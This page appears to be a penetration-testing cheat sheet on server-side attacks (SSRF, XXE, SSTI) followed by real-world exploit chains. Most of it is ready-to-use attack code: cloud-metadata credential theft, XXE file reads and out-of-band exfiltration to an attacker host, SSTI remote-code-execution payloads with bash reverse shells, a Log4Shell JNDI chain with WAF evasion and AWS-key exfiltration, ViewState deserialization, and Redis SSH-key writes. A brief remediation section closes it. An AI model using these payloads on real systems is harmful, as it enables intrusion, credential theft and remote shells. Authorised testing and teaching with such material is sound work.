# Server-Side Attacks (SSRF / XXE / SSTI)

When your input reaches the *server's* parser, HTTP client, or template engine rather than another user's browser, you are in server-side territory. These bugs can read local files, reach services the internet cannot, and lead to remote code execution. In penetration tests, they often bridge a web foothold to internal network access and shells. Map the inputs first during [Web Enumeration](web-enumeration.md), then decide which class each parameter belongs to.

{% hint style="warning" %}
Server-side bugs escalate fast. SSRF becomes cloud-credential theft, XXE becomes source-code and password-hash disclosure, SSTI becomes RCE. Don't stop at the proof (`{{7*7}}` → `49`). For the report, chain it to the file you read, the internal host you reached, or the shell you caught.
{% endhint %}

## The three classes at a glance

| Class | Where the input lands | Best-case outcome |
| --- | --- | --- |
| **SSRF** | The server's HTTP/URL client (an `?url=` fetcher, webhook, PDF/image renderer) | Reach `127.0.0.1`, internal hosts, cloud metadata → creds |
| **XXE** | The server's XML parser (SOAP, SVG, DOCX/XLSX, SAML, config uploads) | Read local files, SSRF, out-of-band exfil |
| **SSTI** | The server's template engine (email/report generators, error pages, profile fields) | Direct RCE in most engines |

---

## SSRF — Server-Side Request Forgery

The server fetches a URL you control. You point it inward — at loopback, at internal ranges, at the cloud metadata endpoint — and read responses the client should never see.

### Find the fetcher

Any parameter that takes a URL, hostname, or file path is a candidate: `url`, `uri`, `path`, `dest`, `redirect`, `feed`, `host`, `port`, `to`, `out`, `image`, `template`, `webhook`. Also PDF/thumbnail generators, "import from URL" features, and XML/SVG uploads (SSRF via XXE, below).

### Basic probes

```
http://<TARGET>/fetch?url=http://127.0.0.1/
http://<TARGET>/fetch?url=http://localhost:8080/admin
http://<TARGET>/fetch?url=http://192.168.1.1/
http://<TARGET>/fetch?url=http://internal.local/
http://<TARGET>/fetch?url=file:///etc/passwd
```

### Cloud metadata — the money shot

If the box is in AWS/GCP/Azure, the metadata service on `169.254.169.254` hands out IAM credentials to anything that can reach it.

```
# AWS — enumerate the role, then grab its keys
http://<TARGET>/fetch?url=http://169.254.169.254/latest/meta-data/
http://<TARGET>/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://<TARGET>/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>

# GCP (needs the Metadata-Flavor header; use a fetcher that forwards it, or an alias below)
http://<TARGET>/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

The AWS response yields `AccessKeyId`, `SecretAccessKey`, and `Token` — feed them straight into `aws configure` / `aws sts get-caller-identity`.

### Filter bypass

Blocklists that string-match `127.0.0.1` or `localhost` fall to alternate encodings and parser confusion.

```
# IP shorthands (all resolve to loopback)
http://127.1/
http://0/
http://0.0.0.0/
http://[::1]/                          # IPv6 loopback
http://2130706433/                     # decimal for 127.0.0.1
http://0x7f.0x0.0x0.0x1/               # hex octets
http://0177.0.0.1/                     # octal

# URL-parser confusion — credentials/@ trick
http://169.254.169.254@<ATTACKER_IP>/
http://<ATTACKER_IP>#@169.254.169.254/

# Case + encoding
http://LoCalHost/
http://%6c%6f%63%61%6c%68%6f%73%74/    # "localhost" URL-encoded
http://127.0.0.%31/

# Alternate schemes (when the client honours them)
gopher://127.0.0.1:6379/_<redis-command>   # smuggle protocols
dict://127.0.0.1:11211/stats               # memcached
file:///etc/passwd
ldap://127.0.0.1:389

# DNS tricks
http://my-localhost.<ATTACKER_DOMAIN>/     # a domain you own that A-records to 127.0.0.1
```

{% hint style="info" %}
Blind SSRF (no response body reflected) is still useful: point it at your own listener to confirm the request fires, port-scan internal ranges by timing/status differences, and abuse `gopher://` to send crafted TCP payloads to Redis/memcached/SMTP.
{% endhint %}

---

## XXE — XML External Entity Injection

Any endpoint that parses XML you supply — SOAP APIs, SAML, RSS import, SVG/DOCX/XLSX uploads, `Content-Type: application/xml` bodies — may resolve external entities. That lets you read files and pivot to SSRF.

### Baseline file read

Declare an entity that points at a local file, then echo it in an element the response reflects.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### High-value files to pull

```xml
<!-- Linux users -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!-- Password hashes (if the parser runs as root) -->
<!ENTITY xxe SYSTEM "file:///etc/shadow">
<!-- App source / DB creds -->
<!ENTITY xxe SYSTEM "file:///var/www/html/config.php">
<!ENTITY xxe SYSTEM "file:///var/www/html/index.php">
<!-- Windows -->
<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
<!ENTITY xxe SYSTEM "file:///C:/inetpub/wwwroot/web.config">
```

{% hint style="info" %}
PHP source usually gets mangled or breaks the XML because `<?php ... ?>` looks like a processing instruction. Read it base64-safely with the PHP filter wrapper: `php://filter/convert.base64-encode/resource=/var/www/html/config.php`, then `base64 -d` the result.
{% endhint %}

### XXE → SSRF

Swap `file://` for `http://` and the parser becomes your SSRF client — reach internal services and metadata.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>
```

### Blind / out-of-band XXE

When output is never reflected, exfiltrate to a server you control using a remote DTD.

```xml
<!-- Sent to the target -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://<ATTACKER_IP>/evil.dtd">
  %dtd;
]>
<root>&exfil;</root>
```

```dtd
<!-- evil.dtd hosted on your box (python3 -m http.server 80) -->
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<ATTACKER_IP>/log?data=%file;'>">
%eval;
%exfil;
```

The base64 of the file lands in your HTTP access log as the `data=` query string.

---

## SSTI — Server-Side Template Injection

The app drops your input into a server-side template (email bodies, report/PDF generators, error messages, username rendering). The engine evaluates it — and most engines expose a path to shell.

### Detection — one payload, five syntaxes

```
{{7*7}}            # Jinja2, Twig, Nunjucks
${7*7}             # FreeMarker, JSP EL, Thymeleaf
${{7*7}}           # combined probe
<%= 7*7 %>         # ERB (Ruby), EJS
#{7*7}             # Ruby, Thymeleaf
[[ 7*7 ]]          # some engines
```

If any renders `49`, the input is evaluated. Confirm the engine (below) before firing the RCE payload.

### Identify the engine

| Response to probe | Likely engine | Language |
| --- | --- | --- |
| `{{7*7}}` → `49` | Jinja2 / Twig | Python / PHP |
| `{{7*7}}` unrendered but `{{7*'7'}}` → `7777777` | Twig | PHP |
| `${7*7}` → `49` | FreeMarker / Velocity | Java |
| `<%= 7*7 %>` → `49` | ERB | Ruby |
| `#{7*7}` → `49` | Ruby / Thymeleaf | Ruby / Java |

### Jinja2 (Flask / Django)

```
# Recon
{{config}}                 # Flask config, often leaks SECRET_KEY
{{config.items()}}
{{request.application.__globals__}}

# RCE
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{lipsum.__globals__.__builtins__['__import__']('os').popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()}}   # find Popen index, then call it

# Reverse shell
{{request.application.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/443 0>&1"').read()}}
```

### Twig (PHP)

```
{{7*7}}                             # → 49 confirms
{{['id']|filter('system')}}         # RCE
{{['id',""]|sort('system')}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
```

### FreeMarker (Java)

```
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
${"freemarker.template.utility.Execute"?new()("id")}
```

### Velocity (Java)

```
#set($e="e")
#set($run=$e.class.forName("java.lang.Runtime").getRuntime().exec("id"))
$run
```

### ERB (Ruby)

```
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').read %>
<%= `bash -i >& /dev/tcp/<ATTACKER_IP>/443 0>&1` %>
```

### Handlebars / Node

```
{{#if 1==1}}vulnerable{{/if}}       # confirm logic evaluation
```

{% hint style="info" %}
`tplmap` automates detection and exploitation across most engines: `tplmap -u 'http://<TARGET>/page?name=*'` then `--os-shell`. Use it to confirm findings, but understand and document the mechanism with the manual payloads above.
{% endhint %}

---

## Real-world server-side chains worth memorizing

These patterns recur in labs and real assessments. Each is a full chain, not a one-line probe.

### WordPress XXE via WAV upload (CVE-2021-29447)

WordPress 5.6–5.7 on PHP 8 parses EXIF metadata in uploaded audio through libXML. A crafted WAV embeds an XXE that loads a remote DTD and exfiltrates files.

```bash
# 1. Build the malicious WAV (valid RIFF/WAVE header + XXE in id3 metadata)
python3 - <<'EOF'
header = b"RIFF\x24\x00\x00\x00WAVEid3 "
xxe    = b'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://<ATTACKER_IP>:8000/evil.dtd">%xxe;]><foo/>'
open("payload.wav","wb").write(header + xxe)
EOF
```

```dtd
<!-- evil.dtd — served from python3 -m http.server 8000 -->
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/wp-config.php">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<ATTACKER_IP>:8000/?data=%file;'>">
%eval;
%exfil;
```

Upload `payload.wav` through the Media Library (any author+ role). The XXE fires on metadata processing; your listener receives `GET /?data=<base64>`. Decode it for `DB_NAME`, `DB_USER`, `DB_PASSWORD`, and the auth keys.

### Log4Shell JNDI injection (CVE-2021-44228)

Log4j 2.x < 2.15.0. Any string the logger touches is a payload sink — usernames, headers, JSON fields.

```bash
# 1. Build and serve the malicious JNDI object
git clone https://github.com/pimps/JNDI-Exploit-Kit && cd JNDI-Exploit-Kit
mvn package -q
java -jar target/JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar \
     -C "bash -c {echo,<BASE64_REVSHELL>}|{base64,-d}|bash" \
     -A <ATTACKER_IP>
# Outputs an LDAP URL, e.g. ldap://<ATTACKER_IP>:1389/Exploit

# 2. Catch the shell
nc -lvnp 443

# 3. Inject the lookup everywhere the logger might see it
curl -s -X POST "http://<TARGET>/api/login" -H "Content-Type: application/json" \
     -d '{"username":"${jndi:ldap://<ATTACKER_IP>:1389/Exploit}","password":"x"}'
curl -s "http://<TARGET>/" -H 'User-Agent: ${jndi:ldap://<ATTACKER_IP>:1389/Exploit}'
curl -s "http://<TARGET>/" -H 'X-Forwarded-For: ${jndi:ldap://<ATTACKER_IP>:1389/Exploit}'
```

WAF evasion via nested lookups:

```
${${::-j}${::-n}${::-d}${::-i}:ldap://<ATTACKER_IP>:1389/x}
${j${::-n}di:ldap://<ATTACKER_IP>:1389/x}
${${lower:j}ndi:ldap://<ATTACKER_IP>:1389/x}
```

**Env-var exfil variant (no RCE needed)** — when the sink is an FTP username or similar, leak secrets over LDAP/DNS:

```bash
ftp <TARGET> 21
# At Name: prompt →
# ${jndi:ldap://<ATTACKER_IP>/user:${env:ftp_user}:pass:${env:ftp_password}}
${jndi:ldap://<ATTACKER_IP>/${env:AWS_ACCESS_KEY_ID}:${env:AWS_SECRET_ACCESS_KEY}}
```

Catch the literal values in `responder`, `tcpdump`, or `nc -lvnp 389`.

### Python `eval()` RCE via JSON body

A Flask/Django API that pipes a field into `eval()`. Tell: the response returns the `repr()` of what you sent.

```bash
# Detection — sending a bare identifier echoes its repr
curl -X POST http://<TARGET>:50000/verify --data-urlencode "code=id"
# → "built-in function id"   ← eval() is running

# Escalate to command output
curl -X POST http://<TARGET>:50000/verify --data-urlencode "code=__import__('os').popen('id').read()"

# Reverse shell
curl -X POST http://<TARGET>:50000/verify --data-urlencode \
  "code=__import__('os').system('bash -c \"bash -i >& /dev/tcp/<ATTACKER_IP>/443 0>&1\"')"
```

### Werkzeug debug console PIN

Flask `/console` exposed with `?__debugger__=yes` plus an LFI on the box. Derive the PIN offline from `probably_public_bits` (username, framework path from the traceback) and `private_bits` (`str(uuid.getnode())` from the NIC MAC in `/sys/class/net/eth0/address`, plus `/etc/machine-id` + the systemd service name from `/proc/self/cgroup`). Reproduce the Werkzeug 2.2+ hashing steps to print the 9-digit PIN, then use `/console` as a Python REPL running as the web user.

### ASP.NET ViewState deserialization

Leaked `machineKey` (from a `web.config` LFI or dev backup) plus a ViewState-using app = RCE.

```powershell
# Windows — ysoserial.net
.\ysoserial.exe -p ViewState -g WindowsIdentity `
  --decryptionalg="AES" --decryptionkey="<DEC>" `
  --validationalg="SHA1" --validationkey="<VAL>" `
  --path="/portfolio" -c "powershell -e <B64_REV>"
```

```bash
# Linux — viewgen
./viewgen --webconfig web.config -m 8E0F0FA3 -c "powershell -e <B64_REV>" -e
# Send the generated string as the __VIEWSTATE POST body
```

### Redis 6379 unauth → SSH key write

Unauthenticated Redis you can reach (directly or via SSRF/`gopher://`) can write your public key into an authorized_keys file with `BGSAVE`.

```bash
ssh-keygen -t rsa -f /tmp/redis_key -N ""
(echo -e "\n\n"; cat /tmp/redis_key.pub; echo -e "\n\n") > /tmp/key.txt
redis-cli -h <TARGET> config set dir /var/lib/redis/.ssh
redis-cli -h <TARGET> config set dbfilename authorized_keys
redis-cli -h <TARGET> -x set ssh_key < /tmp/key.txt
redis-cli -h <TARGET> bgsave
ssh -i /tmp/redis_key redis@<TARGET>
```

---

## Testing workflow

```bash
# 1. From Web Enumeration, list every input: URL params, JSON/XML bodies, headers, file uploads
# 2. Classify each candidate:
#      takes a URL/host/path?      -> SSRF probes
#      parses XML (or SVG/DOCX)?   -> XXE payloads
#      rendered into output text?  -> SSTI {{7*7}} across syntaxes
# 3. Prove the class, THEN escalate:
#      SSRF -> 169.254.169.254 metadata / internal service
#      XXE  -> file read (php://filter) or OOB exfil
#      SSTI -> identify engine -> RCE payload -> shell
# 4. Catch callbacks / exfil on your own listener
python3 -m http.server 80          # OOB exfil + JNDI stager + data catcher
nc -lvnp 443                        # reverse shells
tplmap -u 'http://<TARGET>/p?x=*'   # SSTI confirm/exploit
```

## Prove impact, don't just probe

`49` proves SSTI exists; `id` output proves RCE. A `200` on `169.254.169.254/` proves SSRF; the IAM keys prove the finding. For the [report](report-writing.md), show the concrete consequence — the file you read, the internal host you reached, the credentials you pulled, or the shell — and let that drive the severity rating.

## Fix guidance (for the remediation section)

* **SSRF** — allowlist destination hosts/schemes (never blocklist); re-resolve and re-check the IP *after* DNS to block loopback/link-local/private ranges; drop `gopher`/`dict`/`file`; require IMDSv2 (session tokens) on the metadata service.
* **XXE** — disable DTDs and external entity resolution in the parser (`FEATURE_SECURE_PROCESSING`, `disallow-doctype-decl`, `libxml_disable_entity_loader` on older PHP); prefer JSON over XML where possible.
* **SSTI** — never place user input into template *source*; pass it as sandboxed template *data/variables*; use a logic-less engine and disable dangerous filters/functions.
* **Deserialization / JNDI** — patch Log4j to ≥ 2.17.1; don't deserialize untrusted data; sign/encrypt ViewState and rotate `machineKey`; keep unauth services like Redis off the network edge.

## Related

* [Web Enumeration](web-enumeration.md) — map the inputs and services first
* [HTTP Attacks](http-attacks.md) — verb tampering, IDOR, header injection on the same endpoints
* [File Inclusion](file-inclusion.md) — LFI feeds the Werkzeug PIN and `web.config` chains here
* [Command Injection](command-injection.md) · [SQL Injection](sql-injection.md) · [XSS](xss.md)
* [File Upload](file-upload.md) — the WAV-XXE and SVG-XXE upload vectors
* [Enumeration & Scanning](enumeration-scanning.md) — find the internal services SSRF reaches
* [Report Writing](report-writing.md) — turning a chain into a rated finding
